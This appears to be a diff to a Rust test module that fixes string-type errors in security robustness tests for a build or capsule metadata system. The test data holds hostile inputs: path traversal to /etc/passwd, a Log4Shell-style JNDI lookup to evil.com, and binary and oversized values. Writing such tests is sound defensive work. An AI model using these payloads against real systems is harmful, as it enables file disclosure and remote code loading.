@@ -2557,7 +2557,10 @@ mod tests {
             (0..10_000).map(|i| (format!("key_{}", i), format!("value_{}", i))).collect(),
             // Binary data in metadata
             BTreeMap::from([
-                ("\x00\x01\x02key".to_string(), "\xFF\xFE\xFDvalue".to_string()),
+                (
+                    "\x00\x01\x02key".to_string(),
+                    String::from_utf8_lossy(b"\xFF\xFE\xFDvalue").into_owned(),
+                ),
                 ("normal_key".to_string(), std::str::from_utf8(&vec![0x80; 1000]).unwrap_or("fallback").to_string()),
             ]),
         ];
@@ -2946,7 +2949,10 @@ mod tests {
                 platform: "linux-x86_64".to_string(),
                 config_hash: "g".repeat(64),
                 properties: BTreeMap::from([
-                    ("\x00\x01binary_key".to_string(), "\xFF\xFEbinary_value".to_string()),
+                    (
+                        "\x00\x01binary_key".to_string(),
+                        String::from_utf8_lossy(b"\xFF\xFEbinary_value").into_owned(),
+                    ),
                     ("normal_key".to_string(), std::str::from_utf8(&vec![0x80; 1000]).unwrap_or("fallback").to_string()),
                 ]),
             },
@@ -3869,10 +3875,10 @@ mod tests {
 
             // Attack 2: Runtime version manipulation
             let version_attacks = vec![
-                "1.0.0-../../../etc/passwd",
-                "v\x00\x01\xFF\x7F",
-                "999999999.999999999.999999999",
-                "version with spaces and \t\n special chars",
+                "1.0.0-../../../etc/passwd".to_string(),
+                String::from_utf8_lossy(b"v\x00\x01\xFF\x7F").into_owned(),
+                "999999999.999999999.999999999".to_string(),
+                "version with spaces and \t\n special chars".to_string(),
                 "".to_string(), // Empty version
                 "version_".repeat(1000), // Very long version
             ];
@@ -3891,13 +3897,13 @@ mod tests {
 
             // Attack 3: Config hash collision and format attacks
             let hash_attacks = vec![
-                "not_a_real_hash",
-                "",  // Empty hash
+                "not_a_real_hash".to_string(),
+                "".to_string(),  // Empty hash
                 "0".repeat(1000), // Very long fake hash
-                "invalid_hex_chars_ghijk",
-                "mixed_CASE_Hash_123",
-                "\x00\x01binary_in_hash\xFF",
-                "hash with spaces",
+                "invalid_hex_chars_ghijk".to_string(),
+                "mixed_CASE_Hash_123".to_string(),
+                String::from_utf8_lossy(b"\x00\x01binary_in_hash\xFF").into_owned(),
+                "hash with spaces".to_string(),
             ];
 
             for hash_val in hash_attacks {
@@ -3919,7 +3925,10 @@ mod tests {
             malicious_properties.insert("key".to_string(), "".to_string());
             malicious_properties.insert("path_traversal".to_string(), "../../etc/passwd".to_string());
             malicious_properties.insert("injection".to_string(), "${jndi:ldap://evil.com}".to_string());
-            malicious_properties.insert("\x00null\x01bytes".to_string(), "binary_data\xFF\x7F".to_string());
+            malicious_properties.insert(
+                "\x00null\x01bytes".to_string(),
+                String::from_utf8_lossy(b"binary_data\xFF\x7F").into_owned(),
+            );
             malicious_properties.insert("unicode_🦀_key".to_string(), "emoji_🔒_value".to_string());
             malicious_properties.insert("very_long_key_".repeat(500), "x".repeat(10000));
 
@@ -3984,14 +3993,14 @@ mod tests {
 
             // Attack 2: Capsule ID injection and format attacks
             let id_attacks = vec![
-                "",  // Empty ID
-                "../../etc/passwd",
-                "${jndi:ldap://evil.com}",
-                "\x00\x01\xFF\x7F", // Binary data
+                "".to_string(),  // Empty ID
+                "../../etc/passwd".to_string(),
+                "${jndi:ldap://evil.com}".to_string(),
+                String::from_utf8_lossy(b"\x00\x01\xFF\x7F").into_owned(), // Binary data
                 "very_long_id_".repeat(1000),
-                "unicode_🦀_id",
-                "id with\nlines\rand\ttabs",
-                "normal_id_123",
+                "unicode_🦀_id".to_string(),
+                "id with\nlines\rand\ttabs".to_string(),
+                "normal_id_123".to_string(),
             ];
 
             for id in id_attacks {
